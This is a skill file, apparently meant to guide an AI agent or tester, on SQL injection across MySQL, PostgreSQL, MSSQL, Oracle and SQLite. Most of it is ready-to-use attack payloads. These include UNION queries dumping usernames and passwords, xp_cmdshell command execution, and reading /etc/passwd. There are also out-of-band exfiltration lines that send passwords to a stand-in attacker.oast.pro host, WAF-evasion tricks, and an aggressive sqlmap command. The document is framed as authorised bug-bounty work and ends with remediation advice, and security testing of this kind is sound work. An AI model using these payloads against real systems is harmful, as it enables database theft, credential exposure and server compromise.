---
name: sqli
description: Detect and exploit SQL injection across MySQL, PostgreSQL, MSSQL, SQLite, and Oracle using time-based, boolean-based, error-based, UNION, and out-of-band payloads, WAF bypass tamper scripts, and second-order techniques for detection, exploitation, and remediation.
---

# SQL Injection (SQLi) — Detection, Exploitation & WAF Bypass

SQL injection remains the highest-impact web vulnerability class: the attacker injects SQL syntax into application inputs that reach a database query without parameterization. This skill covers the full lifecycle — detection, DBMS fingerprinting, data extraction, WAF bypass, and remediation.

## When to use this skill

- A web parameter, header, cookie, or JSON/XML body field is reflected into database-driven content (search results, filters, sorting, pagination).
- The application returns database error messages, stack traces, or anomalous 500 responses when quotes or special characters are submitted.
- Login forms, password reset flows, or API endpoints accept user-supplied strings that are concatenated into queries.
- A WAF or input filter blocks obvious payloads and alternate encodings or syntax variants must be tested.
- A bug bounty scope includes legacy endpoints, second-order sinks (stored values re-used in later queries), or admin panels.

## Methodology

### 1. Reconnaissance and Injection Point Enumeration

Enumerate every input that reaches a database query before firing payloads. High-value surfaces include:

- Query parameters: `?id=`, `?search=`, `?sort=`, `?filter=`, `?category=`
- HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie` values (often logged via `INSERT` into audit tables)
- JSON bodies: `{"id": 1}`, `{"user": "admin"}` — test both string and numeric contexts
- XML bodies: attribute values and element text — test with XML entity and quote escapes
- Path segments and REST resource identifiers: `/api/users/1/profile`

Determine the injection context first: numeric (`?id=1`), single-quoted string (`'`), double-quoted string (`"`), or LIKE clause (`%`). The context dictates the closing syntax and comment style required.

### 2. Detection Techniques

#### Step A: Boolean-Based Detection

Submit paired truthy/falsy probes and compare responses byte-for-byte:

```sql
' AND 1=1-- -
' AND 1=2-- -
' OR 1=1-- -
' OR 'a'='a
```

A differential in response length, status code, or content between the truthy and falsy pair confirms injectable logic. For numeric contexts, use `1 AND 1=1` / `1 AND 1=2` without the quote.

#### Step B: Time-Based Blind Detection

When responses are identical regardless of boolean outcome, measure server latency:

```sql
' AND SLEEP(5)-- -
' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)-- -
1;WAITFOR DELAY '0:0:5'--
' AND pg_sleep(5)-- -
' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 0 END FROM dual)-- -
```

A consistent ~5 second delay versus the baseline confirms injection. Repeat three times to rule out network jitter. Time-based is the most reliable detector behind WAFs that strip error output.

#### Step C: Error-Based Detection

Force the database to raise an error that leaks data in the message:

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=CONVERT(int,(SELECT @@version))--
```

The `extractvalue`/`updatexml` XPath error returns the first 32 characters of the concatenated string prefixed with `~` (0x7e). PostgreSQL casting errors and MSSQL `CONVERT` errors leak the full subquery result in the exception text.

#### Step D: UNION-Based Detection with NULL-Count Matching

Determine the column count by incrementing NULLs until the query executes without error:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
```

Once the count is fixed, identify which columns render as text by substituting a marker string positionally:

```sql
' UNION SELECT 'test_probe', NULL, NULL--
' UNION SELECT NULL, 'test_probe', NULL--
' UNION SELECT NULL, NULL, 'test_probe'--
```

Then extract data directly from the reflected columns:

```sql
' UNION SELECT NULL,username,password FROM users-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

### 3. Database Fingerprinting

Identify the RDBMS before deep exploitation — syntax differs materially:

| RDBMS | Version Probe | Current User / DB | String Concatenation |
| :--- | :--- | :--- | :--- |
| **MySQL / MariaDB** | `@@version`, `VERSION()` | `user()`, `database()` | `CONCAT(a, 0x3a, b)` |
| **PostgreSQL** | `version()` | `current_user`, `current_database()` | `a || ':' || b` |
| **MSSQL** | `@@VERSION` | `user_name()`, `db_name()` | `a + ':' + b` |
| **Oracle** | `SELECT banner FROM v$version` | `user`, `ora_database_name` | `a || ':' || b` |
| **SQLite** | `sqlite_version()` | N/A | `a || ':' || b` |

Additional fingerprints: MySQL accepts `SLEEP()` and backtick identifiers; PostgreSQL accepts `::` casts and `pg_sleep()`; MSSQL supports stacked queries via `;` and `WAITFOR DELAY`; Oracle requires `FROM dual` on every bare SELECT; SQLite uses `sqlite_master` for schema enumeration.

### 4. Stacked Queries and Advanced Extraction

MSSQL, PostgreSQL, and MySQL (with `mysqli_multi_query` or similar drivers) permit stacked statements:

```sql
'; EXEC master..xp_cmdshell 'whoami'--
'; SELECT pg_read_file('/etc/passwd')--
```

When only one column is reflected, fold multiple values into a single string:

```sql
' UNION SELECT GROUP_CONCAT(username, 0x3a, password SEPARATOR 0x0a), NULL, NULL FROM users-- -
' UNION SELECT string_agg(username || ':' || password, E'\n'), NULL FROM users-- -
```

### 5. Out-of-Band (OOB) Exfiltration

When no data is reflected and time-based is too slow, exfiltrate via DNS or HTTP callbacks:

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password), '.attacker.oast.pro\\a'))-- -
```

Oracle equivalent using `UTL_HTTP`:

```sql
' UNION SELECT NULL FROM dual WHERE UTL_HTTP.REQUEST('http://attacker.oast.pro/' || (SELECT password FROM users WHERE ROWNUM=1)) IS NOT NULL-- -
```

MSSQL variant: `EXEC master..xp_dirtree '\\'+(SELECT password)+'\x'--`. Monitor the collaborator DNS log for the encoded data.

### 6. Login Bypass and Second-Order Injection

Classic authentication bypass payloads for the username field:

```sql
admin'-- -
admin' #
' OR 1=1-- -
' OR '1'='1
```

Second-order injection occurs when a value is safely stored but later concatenated into a different query. Register a username such as `admin'-- -` or `'; UPDATE users SET role='admin' WHERE user='attacker'-- -`, then trigger the sink (profile update, password change, admin listing) where the stored value is re-used unsanitized.

### 7. WAF and Filter Bypass

Apply tamper transformations when payloads are blocked:

- **Whitespace filtering**: replace spaces with inline comments or tabs: `'UNION/**/SELECT/**/1,2,3--`, `%09`
- **Case manipulation**: `uNiOn SeLeCt` defeats naive case-sensitive keyword matching
- **Keyword stripping bypass**: `UNIunionON SELselectECT` — the filter removes the inner keyword and the remainder reassembles
- **URL double encoding**: `%2527` for `'`, `%2520` for space — defeats single-decode WAF layers
- **Null byte injection**: `%00` truncates suffix queries in legacy C-based filters
- **JSON escapes**: `\u0027` in JSON bodies where the parser decodes after WAF inspection
- **Operator substitution**: `BETWEEN` for `=`, `LIKE` for `=`, `<>` for `!=`

Automate with sqlmap tamper scripts chained together:

```bash
sqlmap -u "https://target.com/item?id=1" --batch --threads=10 --level=5 --risk=3 \
  --tamper=space2comment,between,randomcase,equaltolike,charencode --dbms=mysql --dbs
```

`--level=5` tests headers and cookies; `--risk=3` enables OR-based and time-heavy payloads; `--batch` removes interactive prompts for unattended runs.

## Tooling

- **sqlmap** — automated detection, fingerprinting, dump, and tamper-script WAF bypass engine.
- **ghauri** — modern SQLi extraction tool with strong support for WAF-blocked and UNION-limited targets.
- **Burp Intruder** — manual payload fuzzing across parameters with boolean/time-based payload sets.
- **Hackvertor** — in-Burp payload encoding/transforming (double-URL, hex, unicode escapes) for WAF evasion.
- **Collaborator / interactsh** — out-of-band DNS and HTTP callback listener for OOB exfiltration.

## Verification & Deliverables

1. Confirm every reported injection with a reproducible boolean differential or a consistent time delay (minimum three measurements).
2. Capture the exact raw HTTP request (Burp request file) that triggers the vulnerability, including all headers and cookies.
3. Demonstrate impact with a minimal, non-destructive extraction: `version()`, `current_user`, and one table name — never dump production PII.
4. Record the DBMS fingerprint evidence and the bypass technique used against any WAF.
5. Validate remediation by re-testing after parameterized statements are deployed; confirm the payload no longer alters query semantics.

**Deliverables**

- Findings table mapping each injection point to technique, DBMS, extracted proof data, and severity.
- PoC scripts (curl/Burp request files) reproducing each finding end-to-end.
- Remediation matrix: parameterized statements (never string concatenation or `String.format` SQL), least-privilege DB users, WAF as secondary defense only, error suppression in production, and SAST rules scanning for string-concatenated query construction.
